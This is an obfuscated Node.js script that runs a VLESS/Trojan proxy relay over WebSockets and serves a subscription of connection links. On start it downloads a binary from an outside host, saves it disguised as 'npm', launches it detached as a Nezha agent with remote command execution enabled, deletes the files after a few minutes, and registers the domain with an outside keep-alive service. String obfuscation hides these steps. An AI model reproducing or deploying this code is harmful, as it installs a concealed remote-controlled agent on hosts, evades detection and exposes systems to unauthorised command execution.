const _0x384b61=_0x3769;(function(_0x2aef19,_0x125348){const _0x448c04=_0x3769,_0x5753ea=_0x2aef19();while(!![]){try{const _0x3ee630=-parseInt(_0x448c04(0x189))/0x1*(parseInt(_0x448c04(0x188))/0x2)+parseInt(_0x448c04(0x1b5))/0x3+-parseInt(_0x448c04(0x175))/0x4+-parseInt(_0x448c04(0x1d3))/0x5+parseInt(_0x448c04(0x17c))/0x6+parseInt(_0x448c04(0x1bd))/0x7+-parseInt(_0x448c04(0x194))/0x8;if(_0x3ee630===_0x125348)break;else _0x5753ea['push'](_0x5753ea['shift']());}catch(_0x2340f9){_0x5753ea['push'](_0x5753ea['shift']());}}}(_0x353d,0xe5f69));function _0x353d(){const _0x3da536=['writeHead','512092NzQWDX','send','length','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',':443?security=tls&sni=','stream','text/html','9716028aNhdna','false','setsid\x20nohup\x20./npm\x20-s\x20','config.yaml','application/json','listen','readUInt16BE','slice','url','env','chmod\x20+x\x20npm','npm\x20running\x20error:','211686IABHJQ','1ZLoRyB','error:\x20','readFile','&path=%2F','npm','catch','message','index.html','every','443','1.1.1.1','6885696vZOZZX','https://','2053','trim','concat','unlink','pop','update','toString','end','PORT','arm64','type','sub','arch','close','1234.abc.com','join','text/plain','https://oooo.serv00.net/add-url','&fp=chrome&type=ws&host=','https://amd64.ssss.nyc.mn/v1','data','/bin/bash','Unknown','application/dns-json','aarch64','isp','Server\x20is\x20running\x20on\x20port\x20','post','https://api.ip.sb/geoip','connection','crypto','1806234SohmoU','SUB_PATH','WSPATH','createServer','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','get','replace','UUID','11254677GfbPZf','Failed\x20to\x20resolve\x20','trojan://','2087','https://dns.google/resolve?name=','Automatic\x20Access\x20Task\x20added\x20successfully','8.8.4.4','error','NEZHA_PORT','map','country_code','pipe','split','npm\x20is\x20already\x20running,\x20skip\x20running...','reduce','NEZHA_SERVER','once','\x20-p\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','decode','npm\x20is\x20running','Answer','8963600BhsxKq','writeFileSync','then','finish','write','connect','utf8','Status','substr','Hello\x20world!','readUInt8','find','https://arm64.ssss.nyc.mn/v1','base64','true','sha224','includes','from','NEZHA_KEY','log','ce41f146-6b5e-4b05-94b4-329ae87b4149','Server','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','arm','http','\x20with\x20all\x20DNS\x20servers'];_0x353d=function(){return _0x3da536;};return _0x353d();}const os=require('os'),http=require(_0x384b61(0x172)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require(_0x384b61(0x1b4)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x384b61(0x185)][_0x384b61(0x1bc)]||_0x384b61(0x16e),NEZHA_SERVER=process[_0x384b61(0x185)][_0x384b61(0x1cc)]||'',NEZHA_PORT=process[_0x384b61(0x185)][_0x384b61(0x1c5)]||'',NEZHA_KEY=process['env'][_0x384b61(0x16c)]||'',DOMAIN=process['env']['DOMAIN']||_0x384b61(0x1a4),AUTO_ACCESS=process[_0x384b61(0x185)]['AUTO_ACCESS']||!![],WSPATH=process[_0x384b61(0x185)][_0x384b61(0x1b7)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x384b61(0x185)][_0x384b61(0x1b6)]||_0x384b61(0x1a1),NAME=process[_0x384b61(0x185)]['NAME']||'',PORT=process[_0x384b61(0x185)][_0x384b61(0x19e)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5b9709=_0x384b61;try{const _0x14f3c2=await axios[_0x5b9709(0x1ba)](_0x5b9709(0x1b2)),_0x30344e=_0x14f3c2[_0x5b9709(0x1aa)];ISP=(_0x30344e[_0x5b9709(0x1c7)]+'-'+_0x30344e[_0x5b9709(0x1af)])[_0x5b9709(0x1bb)](/ /g,'_');}catch(_0x38b1e9){ISP=_0x5b9709(0x1ac);}};GetISP();function _0x3769(_0x2df3cb,_0x22cdf9){_0x2df3cb=_0x2df3cb-0x164;const _0x353df8=_0x353d();let _0x3769df=_0x353df8[_0x2df3cb];return _0x3769df;}const httpServer=http[_0x384b61(0x1b8)]((_0x378e76,_0x418216)=>{const _0x31a4bb=_0x384b61;if(_0x378e76['url']==='/'){const _0x46e251=path[_0x31a4bb(0x1a5)](__dirname,_0x31a4bb(0x190));fs[_0x31a4bb(0x18b)](_0x46e251,_0x31a4bb(0x1d9),(_0x3fcad0,_0x47025b)=>{const _0x61fe5=_0x31a4bb;if(_0x3fcad0){_0x418216[_0x61fe5(0x174)](0xc8,{'Content-Type':_0x61fe5(0x17b)}),_0x418216[_0x61fe5(0x19d)](_0x61fe5(0x1dc));return;}_0x418216[_0x61fe5(0x174)](0xc8,{'Content-Type':_0x61fe5(0x17b)}),_0x418216[_0x61fe5(0x19d)](_0x47025b);});return;}else{if(_0x378e76[_0x31a4bb(0x184)]==='/'+SUB_PATH){const _0x44607d=NAME?NAME+'-'+ISP:ISP,_0x30546a='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x31a4bb(0x1a8)+DOMAIN+_0x31a4bb(0x18c)+WSPATH+'#'+_0x44607d,_0x3e1c74=_0x31a4bb(0x1bf)+UUID+'@'+DOMAIN+_0x31a4bb(0x179)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x44607d,_0x4af165=_0x30546a+'\x0a'+_0x3e1c74,_0xa33942=Buffer[_0x31a4bb(0x16b)](_0x4af165)[_0x31a4bb(0x19c)](_0x31a4bb(0x167));_0x418216['writeHead'](0xc8,{'Content-Type':_0x31a4bb(0x1a6)}),_0x418216['end'](_0xa33942+'\x0a');}else _0x418216['writeHead'](0x194,{'Content-Type':_0x31a4bb(0x1a6)}),_0x418216[_0x31a4bb(0x19d)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x384b61(0x16f))]({'server':httpServer}),uuid=UUID[_0x384b61(0x1bb)](/-/g,''),DNS_SERVERS=[_0x384b61(0x1c3),_0x384b61(0x193)];function resolveHost(_0x1cc010){return new Promise((_0x5c533b,_0x41e0f5)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x1cc010)){_0x5c533b(_0x1cc010);return;}let _0x3fca73=0x0;function _0x36aa61(){const _0x2702d1=_0x3769;if(_0x3fca73>=DNS_SERVERS[_0x2702d1(0x177)]){_0x41e0f5(new Error(_0x2702d1(0x1be)+_0x1cc010+_0x2702d1(0x173)));return;}const _0x3b4c35=DNS_SERVERS[_0x3fca73];_0x3fca73++;const _0x1855fc=_0x2702d1(0x1c1)+encodeURIComponent(_0x1cc010)+'&type=A';axios[_0x2702d1(0x1ba)](_0x1855fc,{'timeout':0x1388,'headers':{'Accept':_0x2702d1(0x1ad)}})[_0x2702d1(0x1d5)](_0x2a8f36=>{const _0x311645=_0x2702d1,_0x1a3828=_0x2a8f36['data'];if(_0x1a3828[_0x311645(0x1da)]===0x0&&_0x1a3828['Answer']&&_0x1a3828[_0x311645(0x1d2)]['length']>0x0){const _0x5771fc=_0x1a3828['Answer'][_0x311645(0x165)](_0x4307fa=>_0x4307fa[_0x311645(0x1a0)]===0x1);if(_0x5771fc){_0x5c533b(_0x5771fc[_0x311645(0x1aa)]);return;}}_0x36aa61();})['catch'](_0x4b88b9=>{_0x36aa61();});}_0x36aa61();});}function handleVlessConnection(_0x4ed0df,_0x5f08d5){const _0xaa799f=_0x384b61,[_0x5a58e8]=_0x5f08d5,_0x3be8cd=_0x5f08d5[_0xaa799f(0x183)](0x1,0x11);if(!_0x3be8cd[_0xaa799f(0x191)]((_0x5915b4,_0x52a854)=>_0x5915b4==parseInt(uuid['substr'](_0x52a854*0x2,0x2),0x10)))return![];let _0x16163c=_0x5f08d5[_0xaa799f(0x183)](0x11,0x12)[_0xaa799f(0x164)]()+0x13;const _0x44be4b=_0x5f08d5['slice'](_0x16163c,_0x16163c+=0x2)[_0xaa799f(0x182)](0x0),_0x33d6dc=_0x5f08d5[_0xaa799f(0x183)](_0x16163c,_0x16163c+=0x1)[_0xaa799f(0x164)](),_0x1fbb32=_0x33d6dc==0x1?_0x5f08d5[_0xaa799f(0x183)](_0x16163c,_0x16163c+=0x4)[_0xaa799f(0x1a5)]('.'):_0x33d6dc==0x2?new TextDecoder()[_0xaa799f(0x1d0)](_0x5f08d5['slice'](_0x16163c+0x1,_0x16163c+=0x1+_0x5f08d5['slice'](_0x16163c,_0x16163c+0x1)[_0xaa799f(0x164)]())):_0x33d6dc==0x3?_0x5f08d5[_0xaa799f(0x183)](_0x16163c,_0x16163c+=0x10)['reduce']((_0x57ec11,_0x38efce,_0xf01644,_0x26af38)=>_0xf01644%0x2?_0x57ec11[_0xaa799f(0x198)](_0x26af38['slice'](_0xf01644-0x1,_0xf01644+0x1)):_0x57ec11,[])[_0xaa799f(0x1c6)](_0x3d2e1d=>_0x3d2e1d['readUInt16BE'](0x0)[_0xaa799f(0x19c)](0x10))[_0xaa799f(0x1a5)](':'):'';_0x4ed0df[_0xaa799f(0x176)](new Uint8Array([_0x5a58e8,0x0]));const _0x4512f=createWebSocketStream(_0x4ed0df);return resolveHost(_0x1fbb32)[_0xaa799f(0x1d5)](_0x509dd4=>{const _0x335964=_0xaa799f;net[_0x335964(0x1d8)]({'host':_0x509dd4,'port':_0x44be4b},function(){const _0x2113cb=_0x335964;this['write'](_0x5f08d5[_0x2113cb(0x183)](_0x16163c)),_0x4512f['on'](_0x2113cb(0x1c4),()=>{})[_0x2113cb(0x1c8)](this)['on'](_0x2113cb(0x1c4),()=>{})[_0x2113cb(0x1c8)](_0x4512f);})['on'](_0x335964(0x1c4),()=>{});})['catch'](_0x5d83e6=>{const _0x2e5b21=_0xaa799f;net[_0x2e5b21(0x1d8)]({'host':_0x1fbb32,'port':_0x44be4b},function(){const _0x6534a8=_0x2e5b21;this[_0x6534a8(0x1d7)](_0x5f08d5[_0x6534a8(0x183)](_0x16163c)),_0x4512f['on'](_0x6534a8(0x1c4),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x4512f);})['on'](_0x2e5b21(0x1c4),()=>{});}),!![];}function handleTrojanConnection(_0x8d63e7,_0x301f2e){const _0x441515=_0x384b61;try{if(_0x301f2e[_0x441515(0x177)]<0x3a)return![];const _0x2bd297=_0x301f2e['slice'](0x0,0x38)[_0x441515(0x19c)](),_0x106030=[UUID];let _0x551712=null;for(const _0x410040 of _0x106030){const _0x2453f1=crypto['createHash'](_0x441515(0x169))[_0x441515(0x19b)](_0x410040)['digest']('hex');if(_0x2453f1===_0x2bd297){_0x551712=_0x410040;break;}}if(!_0x551712)return![];let _0x2216a9=0x38;_0x301f2e[_0x2216a9]===0xd&&_0x301f2e[_0x2216a9+0x1]===0xa&&(_0x2216a9+=0x2);const _0x44eca0=_0x301f2e[_0x2216a9];if(_0x44eca0!==0x1)return![];_0x2216a9+=0x1;const _0x4da457=_0x301f2e[_0x2216a9];_0x2216a9+=0x1;let _0x344782,_0x5b9998;if(_0x4da457===0x1)_0x344782=_0x301f2e['slice'](_0x2216a9,_0x2216a9+0x4)[_0x441515(0x1a5)]('.'),_0x2216a9+=0x4;else{if(_0x4da457===0x3){const _0x1efa3c=_0x301f2e[_0x2216a9];_0x2216a9+=0x1,_0x344782=_0x301f2e[_0x441515(0x183)](_0x2216a9,_0x2216a9+_0x1efa3c)[_0x441515(0x19c)](),_0x2216a9+=_0x1efa3c;}else{if(_0x4da457===0x4)_0x344782=_0x301f2e['slice'](_0x2216a9,_0x2216a9+0x10)[_0x441515(0x1cb)]((_0x51a626,_0x42ed74,_0x333583,_0x3993c8)=>_0x333583%0x2?_0x51a626[_0x441515(0x198)](_0x3993c8[_0x441515(0x183)](_0x333583-0x1,_0x333583+0x1)):_0x51a626,[])[_0x441515(0x1c6)](_0x4e2ee9=>_0x4e2ee9['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),_0x2216a9+=0x10;else return![];}}_0x5b9998=_0x301f2e[_0x441515(0x182)](_0x2216a9),_0x2216a9+=0x2;_0x2216a9<_0x301f2e[_0x441515(0x177)]&&_0x301f2e[_0x2216a9]===0xd&&_0x301f2e[_0x2216a9+0x1]===0xa&&(_0x2216a9+=0x2);const _0x120dcb=createWebSocketStream(_0x8d63e7);return resolveHost(_0x344782)['then'](_0x4d2488=>{const _0x3ae1db=_0x441515;net[_0x3ae1db(0x1d8)]({'host':_0x4d2488,'port':_0x5b9998},function(){const _0x14c362=_0x3ae1db;_0x2216a9<_0x301f2e['length']&&this[_0x14c362(0x1d7)](_0x301f2e['slice'](_0x2216a9)),_0x120dcb['on'](_0x14c362(0x1c4),()=>{})['pipe'](this)['on']('error',()=>{})[_0x14c362(0x1c8)](_0x120dcb);})['on']('error',()=>{});})[_0x441515(0x18e)](_0x34ca46=>{const _0xc1aeea=_0x441515;net['connect']({'host':_0x344782,'port':_0x5b9998},function(){const _0x10dc1f=_0x3769;_0x2216a9<_0x301f2e[_0x10dc1f(0x177)]&&this[_0x10dc1f(0x1d7)](_0x301f2e[_0x10dc1f(0x183)](_0x2216a9)),_0x120dcb['on'](_0x10dc1f(0x1c4),()=>{})[_0x10dc1f(0x1c8)](this)['on']('error',()=>{})[_0x10dc1f(0x1c8)](_0x120dcb);})['on'](_0xc1aeea(0x1c4),()=>{});}),!![];}catch(_0x218bf0){return![];}}wss['on'](_0x384b61(0x1b3),(_0x515647,_0x1ac203)=>{const _0x27204d=_0x384b61,_0x156215=_0x1ac203[_0x27204d(0x184)]||'';_0x515647[_0x27204d(0x1cd)](_0x27204d(0x18f),_0x523999=>{const _0x56f4f2=_0x27204d;if(_0x523999[_0x56f4f2(0x177)]>0x11&&_0x523999[0x0]===0x0){const _0x44c550=_0x523999[_0x56f4f2(0x183)](0x1,0x11),_0x273c40=_0x44c550[_0x56f4f2(0x191)]((_0x3fb861,_0x4f42ad)=>_0x3fb861==parseInt(uuid[_0x56f4f2(0x1db)](_0x4f42ad*0x2,0x2),0x10));if(_0x273c40){!handleVlessConnection(_0x515647,_0x523999)&&_0x515647[_0x56f4f2(0x1a3)]();return;}}!handleTrojanConnection(_0x515647,_0x523999)&&_0x515647[_0x56f4f2(0x1a3)]();})['on'](_0x27204d(0x1c4),()=>{});});const getDownloadUrl=()=>{const _0xc60f52=_0x384b61,_0x3a1478=os[_0xc60f52(0x1a2)]();return _0x3a1478===_0xc60f52(0x171)||_0x3a1478===_0xc60f52(0x19f)||_0x3a1478===_0xc60f52(0x1ae)?!NEZHA_PORT?_0xc60f52(0x166):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0xc60f52(0x1a9):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x5718c3=_0x384b61;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x439e07=getDownloadUrl(),_0x272744=await axios({'method':_0x5718c3(0x1ba),'url':_0x439e07,'responseType':_0x5718c3(0x17a)}),_0x8bea29=fs['createWriteStream'](_0x5718c3(0x18d));return _0x272744['data'][_0x5718c3(0x1c8)](_0x8bea29),new Promise((_0xfe455a,_0x30d8e2)=>{const _0xcb3a97=_0x5718c3;_0x8bea29['on'](_0xcb3a97(0x1d6),()=>{const _0x42c386=_0xcb3a97;console[_0x42c386(0x16d)]('npm\x20download\x20successfully'),exec(_0x42c386(0x186),_0x47c06c=>{if(_0x47c06c)_0x30d8e2(_0x47c06c);_0xfe455a();});}),_0x8bea29['on'](_0xcb3a97(0x1c4),_0x30d8e2);});}catch(_0x4fb2ee){throw _0x4fb2ee;}},runnz=async()=>{const _0x555afb=_0x384b61;try{const _0x58d8d8=execSync(_0x555afb(0x1b9),{'encoding':'utf-8'});if(_0x58d8d8[_0x555afb(0x197)]()!==''){console[_0x555afb(0x16d)](_0x555afb(0x1ca));return;}}catch(_0x403c79){}await downloadFile();let _0x1c5b3a='',_0x1d44fa=[_0x555afb(0x192),'8443','2096',_0x555afb(0x1c0),'2083',_0x555afb(0x196)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x9fb024=_0x1d44fa[_0x555afb(0x16a)](NEZHA_PORT)?'--tls':'';_0x1c5b3a=_0x555afb(0x17e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x555afb(0x1ce)+NEZHA_KEY+'\x20'+_0x9fb024+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x428579=NEZHA_SERVER[_0x555afb(0x16a)](':')?NEZHA_SERVER[_0x555afb(0x1c9)](':')[_0x555afb(0x19a)]():'',_0x500971=_0x1d44fa[_0x555afb(0x16a)](_0x428579)?_0x555afb(0x168):_0x555afb(0x17d),_0x24ec4f='client_secret:\x20'+NEZHA_KEY+_0x555afb(0x1cf)+NEZHA_SERVER+_0x555afb(0x178)+_0x500971+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x555afb(0x1d4)](_0x555afb(0x17f),_0x24ec4f);}_0x1c5b3a=_0x555afb(0x170);}else{console[_0x555afb(0x16d)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x1c5b3a,{'shell':_0x555afb(0x1ab)},_0x41a626=>{const _0x528638=_0x555afb;if(_0x41a626)console['error'](_0x528638(0x187),_0x41a626);else console[_0x528638(0x16d)](_0x528638(0x1d1));});}catch(_0x5c9cde){console[_0x555afb(0x1c4)](_0x555afb(0x18a)+_0x5c9cde);}};async function addAccessTask(){const _0x336512=_0x384b61;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x504fe4=_0x336512(0x195)+DOMAIN;try{const _0x57b46e=await axios[_0x336512(0x1b1)](_0x336512(0x1a7),{'url':_0x504fe4},{'headers':{'Content-Type':_0x336512(0x180)}});console[_0x336512(0x16d)](_0x336512(0x1c2));}catch(_0x3b78c8){}}const delFiles=()=>{const _0x3d07e6=_0x384b61;fs[_0x3d07e6(0x199)](_0x3d07e6(0x18d),()=>{}),fs['unlink'](_0x3d07e6(0x17f),()=>{});};httpServer[_0x384b61(0x181)](PORT,()=>{const _0x322d48=_0x384b61;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x322d48(0x16d)](_0x322d48(0x1b0)+PORT);});
